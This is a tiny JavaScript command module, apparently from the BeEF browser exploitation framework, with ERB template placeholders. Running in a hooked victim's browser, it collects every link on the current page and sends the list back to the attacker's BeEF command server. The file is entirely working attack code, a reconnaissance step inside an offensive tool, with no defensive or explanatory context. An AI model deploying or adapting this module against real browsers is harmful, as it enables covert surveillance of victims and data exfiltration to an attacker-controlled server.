beef.execute(function() {

	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "links="+escape(beef.dom.getLinks().toString()));
	
});

